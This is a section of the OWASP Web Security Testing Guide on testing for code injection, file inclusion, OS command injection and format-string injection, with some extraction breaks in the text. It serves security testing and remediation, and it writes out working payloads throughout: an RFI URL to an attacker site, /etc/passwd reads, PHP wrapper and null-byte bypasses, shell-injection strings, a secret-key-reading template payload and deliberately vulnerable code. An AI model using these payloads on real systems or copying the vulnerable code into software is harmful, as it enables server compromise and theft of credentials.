# WSTG INPV (Input Validation) — Code, Command & Format-String Injection

OWASP Web Security Testing Guide v4.2. Subset of the Input Validation category (server-side code execution, OS command injection, format-string injection). 3 test cases: WSTG-INPV-11, WSTG-INPV-12, WSTG-INPV-13.

## Table of Contents

- [WSTG-INPV-11 — Testing for Code Injection](#wstg-inpv-11)
- [WSTG-INPV-12 — Testing for Command Injection](#wstg-inpv-12)
- [WSTG-INPV-13 — Testing for Format String Injection](#wstg-inpv-13)

---

## WSTG-INPV-11

**Testing for Code Injection**

Summary
This section describes how a tester can check if it is possible to enter code as input on a web page and have it
executed by the web server.
In Code Injection testing, a tester submits input that is processed by the web server as dynamic code or as an included
file. These tests can target various server-side scripting engines, e.g., ASP or PHP. Proper input validation and secure
coding practices need to be employed to protect against these attacks.

Test Objectives
Identify injection points where you can inject code into the application.
Assess the injection severity.

How to Test
Black-Box Testing
Testing for PHP Injection Vulnerabilities
Using the querystring, the tester can inject code (in this example, a malicious URL) to be processed as part of the
included file:
http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a

The malicious URL is accepted as a parameter for the PHP page, which will later use the value in an included file.

Gray-Box Testing
Testing for ASP Code Injection Vulnerabilities
Examine ASP code for user input used in execution functions. Can the user enter commands into the Data input field?
Here, the ASP code will save the input to a file and then execute it:

<%
If not isEmpty(Request( "Data" ) ) Then
Dim fso, f
'User input Data is written to a file named data.txt
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
f.Write Request("Data") & vbCrLf
f.close
Set f = nothing
Set fso = Nothing
'Data.txt is executed
Server.Execute( "data.txt" )
Else
%>
<form>
<input name="Data" /><input type="submit" name="Enter Data" />
</form>

<%
End If
%>)))

References
Security Focus
Insecure.org
Wikipedia
Reviewing Code for OS Injection

Testing for Local File Inclusion
Summary
The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion"
mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input
without proper validation.
This can lead to something as outputting the contents of the file, but depending on the severity, it can also lead to:
Code execution on the web server
Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting
(XSS)
Denial of Service (DoS)
Sensitive Information Disclosure
Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server,
through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for
example, when a page receives, as input, the path to the file that has to be included and this input is not properly
sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. Although most examples point
to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and
others.

How to Test
Since LFI occurs when paths passed to include statements are not properly sanitized, in a blackbox testing approach,
we should look for scripts which take filenames as parameters.
Consider the following example:
http://vulnerable_host/preview.php?file=example.html

This looks as a perfect place to try for LFI. If an attacker is lucky enough, and instead of selecting the appropriate page
from the array by its name, the script directly includes the input parameter, it is possible to include arbitrary files on the
server.
Typical proof-of-concept would be to load passwd file:
http://vulnerable_host/preview.php?file=../../../../etc/passwd

If the above mentioned conditions are met, an attacker would see something like the following:

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
...

Even when such a vulnerability exists, its exploitation could be more complex in real life scenarios. Consider the
following piece of code:

<?php include($_GET['file'].".php"); ?>

Simple substitution with a random filename would not work as the postfix .php is appended to the provided input. In
order to bypass it, a tester can use several techniques to get the expected exploitation.

Null Byte Injection
The null character (also known as null terminator or null byte ) is a control character with the value zero
present in many character sets that is being used as a reserved character to mark the end of a string. Once used, any
character after this special byte will be ignored. Commonly the way to inject this character would be with the URL
encoded string %00 by appending it to the requested path. In our previous sample, performing a request to
http://vulnerable_host/preview.php?file=../../../../etc/passwd%00 would ignore the

extension being
added to the input filename, returning to an attacker a list of basic users as a result of a successful exploitation.
.php

Path and Dot Truncation
Most PHP installations have a filename limit of 4096 bytes. If any given filename is longer than that length, PHP simply
truncates it, discarding any additional characters. Abusing this behavior makes it possible to make the PHP engine
ignore the .php extension by moving it out of the 4096 bytes limit. When this happens, no error is triggered; the
additional characters are simply dropped and PHP continues its execution normally.
This bypass would commonly be combined with other logic bypass strategies such as encoding part of the file path with
Unicode encoding, the introduction of double encoding, or any other input that would still represent the valid desired
filename.

PHP Wrappers
Local File Inclusion vulnerabilities are commonly seen as read only vulnerabilities that an attacker can use to read
sensitive data from the server hosting the vulnerable application. However, in some specific implementations this
vulnerability can be used to upgrade the attack from LFI to Remote Code Execution vulnerabilities that could potentially
fully compromise the host.
This enhancement is common when an attacker could be able to combine the LFI vulnerability with certain PHP
wrappers.
A wrapper is a code that surrounds other code to perform some added functionality. PHP implements many built-in
wrappers to be used with file system functions. Once their usage is detected during the testing process of an
application, it's a good practice to try to abuse it to identify the real risk of the detected weakness(es). Below you can
get a list with the most commonly used wrappers, even though you should consider that it is not exhaustive and at the
same time it is possible to register custom wrappers that if employed by the target, would require a deeper ad hoc
analysis.
PHP Filter
Used to access the local file system; this is a case insensitive wrapper that provides the capability to apply filters to a
stream at the time of opening a file. This wrapper can be used to get content of a file preventing the server from
executing it. For example, allowing an attacker to read the content of PHP files to get source code to identify sensitive
information such as credentials or other exploitable vulnerabilities.
The wrapper can be used like php://filter/convert.base64-encode/resource=FILE where FILE is the file to
retrieve. As a result of the usage of this execution, the content of the target file would be read, encoded to base64 (this
is the step that prevents the execution server-side), and returned to the User-Agent.
PHP ZIP
On PHP 7.2.0, the zip:// wrapper was introduced to manipulate zip compressed files. This wrapper expects the
following parameter structure: zip:///filename_path#internal_filename where filename_path is the path to the

malicious file and internal_filename is the path where the malicious file is place inside the processed ZIP file.
During the exploitation, it's common that the # would be encoded with it's URL Encoded value %23 .
Abuse of this wrapper could allow an attacker to design a malicious ZIP file that could be uploaded to the server, for
example as an avatar image or using any file upload system available on the target website (the php:zip:// wrapper
does not require the zip file to have any specific extension) to be executed by the LFI vulnerability.
In order to test this vulnerability, the following procedure could be followed to attack the previous code example
provided.
1. Create the PHP file to be executed, for example with the content <?php phpinfo(); ?> and save it as code.php
2. Compress it as a new ZIP file called target.zip
3. Rename the target.zip file to target.jpg to bypass the extension validation and upload it to the target website
as your avatar image.
4. Supposing that the target.jpg file is stored locally on the server to the ../avatar/target.jpg path, exploit the
vulnerability with the PHP ZIP wrapper by injecting the following payload to the vulnerable URL:
zip://../avatar/target.jpg%23code (remember that %23 corresponds to # ).
Since

on

our

sample

the

.php

extension

is

concatenated

to

our

payload,

the

request

to

http://vulnerable_host/preview.php?file=zip://../avatar/target.jpg%23code will result in the execution of the
code.php file existing in the malicious ZIP file.

PHP Data
Available since PHP 5.2.0, this wrapper expects the following usage: data://text/plain;base64,BASE64_STR where
BASE64_STR is expected to be the Base64 encoded content of the file to be processed. It's important to consider that

this wrapper would only be avaliable if the option allow_url_include would be enabled.
In order to test the LFI using this wrapper, the code to be executed should be Base64 encoded, for example, the <?php
phpinfo(); ?>

code would be encoded as: PD9waHAgcGhwaW5mbygpOyA/Pg== so the payload would result as:

data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== .

PHP Expect
This wrapper, which is not enabled by default, provides access to processes stdio , stdout and stderr . Expecting
to be used as expect://command the server would execute the provided command on BASH and return it's result.

Remediation
The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing user-submitted input to any
filesystem/framework API. If this is not possible the application can maintain an allow list of files, that may be included
by the page, and then use an identifier (for example the index number) to access to the selected file. Any request
containing an invalid identifier has to be rejected, in this way there is no attack surface for malicious users to
manipulate the path.
Check out the File Upload Cheat Sheet for good security practices on this topic.

Tools
kadimus
LFI Suite
OWASP Zed Attack Proxy (ZAP)

References
Wikipedia
Null character
Unicode Encoding

Double Encoding
PHP Supported Protocols and Wrappers
RFC 2397 - The "data" URL scheme

Testing for Remote File Inclusion
Summary
The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion"
mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input
without proper validation.
This can lead to something as outputting the contents of the file, but depending on the severity, it can also lead to:
Code execution on the web server
Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting
(XSS)
Denial of Service (DoS)
Sensitive Information Disclosure
Remote File Inclusion (also known as RFI) is the process of including remote files through the exploiting of vulnerable
inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as
input, the path to the file that has to be included and this input is not properly sanitized, allowing external URL to be
injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in
other technologies such as JSP, ASP and others.

How to Test
Since RFI occurs when paths passed to "include" statements are not properly sanitized, in a black-box testing
approach, we should look for scripts which take filenames as parameters. Consider the following PHP example:

$incfile = $_REQUEST["file"];
include($incfile.".php");

In this example the path is extracted from the HTTP request and no input validation is done (for example, by checking
the input against an allow list), so this snippet of code results vulnerable to this type of attack. Consider the following
URL:
http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page

In this case the remote file is going to be included and any code contained in it is going to be run by the server.

Remediation
The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing user-submitted input to any
filesystem/framework API. If this is not possible the application can maintain an allow list of files, that may be included
by the page, and then use an identifier (for example the index number) to access to the selected file. Any request
containing an invalid identifier has to be rejected, in this way there is no attack surface for malicious users to
manipulate the path.

References
"Remote File Inclusion"
Wikipedia: "Remote File Inclusion"

---

## WSTG-INPV-12

**Testing for Command Injection**

Summary
This article describes how to test an application for OS command injection. The tester will try to inject an OS command
through an HTTP request to the application.
OS command injection is a technique used via a web interface in order to execute OS commands on a web server. The
user supplies operating system commands through a web interface in order to execute OS commands. Any web
interface that is not properly sanitized is subject to this exploit. With the ability to execute OS commands, the user can
upload malicious programs or even obtain passwords. OS command injection is preventable when security is
emphasized during the design and development of applications.

Test Objectives
Identify and assess the command injection points.

How to Test
When viewing a file in a web application, the filename is often shown in the URL. Perl allows piping data from a
process into an open statement. The user can simply append the Pipe symbol | onto the end of the filename.
Example URL before alteration:
http://sensitive/cgi-bin/userData.pl?doc=user1.txt

Example URL modified:
http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|

This will execute the command /bin/ls .
Appending a semicolon to the end of a URL for a .PHP page followed by an operating system command, will execute
the command. %3B is URL encoded and decodes to semicolon
Example:
http://sensitive/something.php?dir=%3Bcat%20/etc/passwd

Example
Consider the case of an application that contains a set of documents that you can browse from the Internet. If you fire up
a personal proxy (such as ZAP or Burp Suite), you can obtain a POST HTTP like the following
( http://www.example.com/public/doc ):

POST /public/doc HTTP/1.1
Host: www.example.com
[...]
Referer: http://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded

Content-length: 33
Doc=Doc1.pdf

In this post request, we notice how the application retrieves the public documentation. Now we can test if it is possible
to add an operating system command to inject in the POST HTTP. Try the following
( http://www.example.com/public/doc ):

POST /public/doc HTTP/1.1
Host: www.example.com
[...]
Referer: http://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33
Doc=Doc1.pdf+|+Dir c:\

If the application doesn't validate the request, we can obtain the following result:

Exec Results for 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+|+Dir c:\'
Output...
Il volume nell'unità C non ha etichetta.
Numero di serie Del volume: 8E3F-4B61
Directory of c:\
18/10/2006 00:27 2,675 Dir_Prog.txt
18/10/2006 00:28 3,887 Dir_ProgFile.txt
16/11/2006 10:43
Doc
11/11/2006 17:25
Documents and Settings
25/10/2006 03:11
I386
14/11/2006 18:51
h4ck3r
30/09/2005 21:40 25,934
OWASP1.JPG
03/11/2006 18:29
Prog
18/11/2006 11:20
Program Files
16/11/2006 21:12
Software
24/10/2006 18:25
Setup
24/10/2006 23:37
Technologies
18/11/2006 11:14
3 File 32,496 byte
13 Directory 6,921,269,248 byte disponibili
Return code: 0

In this case, we have successfully performed an OS injection attack.

Special Characters for Comand Injection
The following special character can be used for command injection such as | ; & $ > < ' !
cmd1|cmd2 : Uses of | will make command 2 to be executed weather command 1 execution is successful or not.
cmd1;cmd2 : Uses of ; will make command 2 to be executed weather command 1 execution is successful or not.

cmd1||cmd2 : Command 2 will only be executed if command 1 execution fails.
cmd1&&cmd2 : Command 2 will only be executed if command 1 execution succeeds.
$(cmd) : For example, echo $(whoami) or $(touch test.sh; echo 'ls' > test.sh)
cmd : It's used to execute specific command. For example, whoami
>(cmd) : >(ls)
<(cmd) : <(ls)

Code Review Dangerous API
Be aware of the uses of following API as it may introduce the command injection risks.

Java
Runtime.exec()

C/C++
system
exec
ShellExecute

Python
exec
eval
os.system
os.popen
subprocess.popen
subprocess.call

PHP
system
shell_exec
exec
proc_open
eval

Remediation
Sanitization
The URL and form data needs to be sanitized for invalid characters. A deny list of characters is an option but it may be
difficult to think of all of the characters to validate against. Also there may be some that were not discovered as of yet.
An allow list containing only allowable characters or command list should be created to validate the user input.
Characters that were missed, as well as undiscovered threats, should be eliminated by this list.
General deny list to be included for command injection can be | ; & $ > < ' \ ! >> #
Escape or filter special characters for windows, ( ) < > & * ' | = ? ; [ ] ^ ~ ! . " % @ / \
: + , ` Escape or filter special characters for Linux, { } ( ) > < & * ' | = ? ; [ ] $ - # ~
!

.

"

%

/

\

:

+

,

`

Permissions
The web application and its components should be running under strict permissions that do not allow operating system
command execution. Try to verify all this information to test from a gray-box testing point of view.

Tools
OWASP WebGoat
Commix

References
Penetration Testing for Web Applications (Part Two)
OS Commanding
CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
ENV33-C. Do not call system()

---

## WSTG-INPV-13

**Testing for Format String Injection**

Summary
A format string is a null-terminated character sequence that also contains conversion specifiers interpreted or
converted at runtime. If server-side code concatenates a user's input with a format string, an attacker can append
additional conversion specifiers to cause a runtime error, information disclosure, or buffer overflow.
The worst case for format strings vulnerabilities occur in languages that don't check arguments and also include a %n
specifier that writes to memory. These functions, if exploited by an attacker modifying a format string, could cause
information disclosure and code execution:
C and C++ printf and similar methods fprintf, sprintf, snprintf
Perl printf and sprintf
These format string functions cannot write to memory, but attackers can still cause information disclosure by changing
format strings to output values the developers did not intend to send:
Python 2.6 and 2.7 str.format and Python 3 unicode str.format can be modified by injecting strings that can point to
other variables in memory
The following format string functions can cause runtime errors if the attacker adds conversion specifiers:
Java String.format and PrintStream.format
PHP printf
The code pattern that causes a format string vulnerability is a call to a string format function that contains unsanitized
user input. The following example shows how a debug printf could make a program vulnerable:
The example in C:

char *userName = /* input from user controlled field */;
printf("DEBUG Current user: ");
// Vulnerable debugging code
printf(userName);

The example in Java:

final String userName = /* input from user controlled field */;
System.out.printf("DEBUG Current user: ");
// Vulnerable code:
System.out.printf(userName);

In this particular example, if the attacker set their userName to have one or more conversion specifiers, there would be
unwanted behaviour. The C example would print out memory contents if userName contained %p%p%p%p%p , and it can
corrupt memory contents if there is a %n in the string. In the Java example, a username containing any specifier that

needs an input (including %x or %s ) would cause the program to crash with IllegalFormatException . Although the
examples are still subject to other problems, the vulnerability can be fixed by printf arguments of printf("DEBUG
Current user: %s", userName) .

Test Objectives
Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired
behaviour from the application.

How to Test
Tests include analysis of the code and injecting conversion specifiers as user input to the application under test.

Static Analysis
Static analysis tools can find format string vulnerabilities in either the code or in binaries. Examples of tools include:
C and C++: Flawfinder
Java: FindSecurityBugs rule FORMAT_STRING_MANIPULATION
PHP: String formatter Analyzer in phpsa

Manual Code Inspection
Static analysis may miss more subtle cases including format strings generated by complex code. To look for
vulnerabilities manually in a codebase, a tester can look for all calls in the codebase that accept a format string and
trace back to make sure untrusted input cannot change the format string.

Conversion Specifier Injection
Testers can check at the unit test or full system test level by sending conversion specifiers in any string input. Fuzz the
program using all of the conversion specifiers for all languages the system under test uses. See the OWASP Format
string attack page for possible inputs to use. If the test fails, the program will crash or display an unexpected output. If
the test passes, the attempt to send a conversion specifier should be blocked, or the string should go through the
system with no issues as with any other valid input.
The examples in the following subsections have a URL of this form:
https://vulnerable_host/userinfo?username=x

The user-controlled value is x (for the username parameter).
Manual Injection
Testers can perform a manual test using a web browser or other web API debugging tools. Browse to the web
application or site such that the query has conversion specifiers. Note that most conversion specifiers need encoding if
sent inside a URL because they contain special characters including % and { . The test can introduce a string of
specifiers %s%s%s%n by browsing with the following URL:
https://vulnerable_host/userinfo?username=%25s%25s%25s%25n

If the web site is vulnerable, the browser or tool should receive an error, which may include a timeout or an HTTP return
code 500.
The Java code returns the error
java.util.MissingFormatArgumentException: Format specifier '%s'

Depending on the C implementation, the process may crash completely with Segmentation Fault .
Tool Assisted Fuzzing

Fuzzing tools including wfuzz can automate injection tests. For wfuzz, start with a text file (fuzz.txt in this example) with
one input per line:
fuzz.txt:

alice
%s%s%s%n
%p%p%p%p%p
{event.__init__.__globals__[CONFIG][SECRET_KEY]}

The fuzz.txt file contains the following:
A valid input alice to verify the application can process a normal input
Two strings with C-like conversion specifiers
One Python conversion specifier to attempt to read global variables
To send the fuzzing input file to the web application under test, use the following command:
wfuzz -c -z file,fuzz.txt,urlencode https://vulnerable_host/userinfo?username=FUZZ

In the above call, the urlencode argument enables the approprate escaping for the strings and FUZZ (with the capital
letters) tells the tool where to introduce the inputs.
An example output is as follows

ID
Response
Lines
Word
Chars
Payload
===================================================================
000000002:
0 L
5 W
142 Ch
"%25s%25s%25s%25n"
000000003:
0 L
5 W
137 Ch
"%25p%25p%25p%25p%25p"
000000004:
0 L
1 W
48 Ch
"%7Bevent.__init__.__globals__%5BCONFIG%5D%5BSECRET_KEY%5D%7D"
000000001:
0 L
1 W
5 Ch
"alice"

The above result validates the application's weakness to the injection of C-like conversion specifiers %s and %p .

---
